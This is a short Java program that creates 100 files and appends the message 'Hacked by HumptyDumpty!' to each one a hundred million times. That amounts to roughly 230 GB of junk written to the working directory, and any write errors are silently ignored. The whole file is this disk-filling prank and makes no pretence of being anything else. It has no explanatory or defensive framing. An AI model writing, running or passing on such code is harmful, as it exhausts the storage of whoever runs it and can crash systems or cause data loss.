package infinitefile;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class InfiniteFile {

    public static void main(String[] args) {

        int i = 1;
        String text = "Hacked by HumptyDumpty!";

        try {
            while (i < 101) {

                String converter = Integer.toString(i);
                String fileName = "file";
                fileName = fileName.concat(converter);

                File fPTr = new File(fileName);
                try ( FileWriter fw = new FileWriter(fPTr, true)) {
                    for (int j = 0; j < Math.pow(100, 4); j++) {
                        fw.write(text);
                    }

                    i += 1;
                }

            }

        } catch (IOException e) {
        }
    }
}
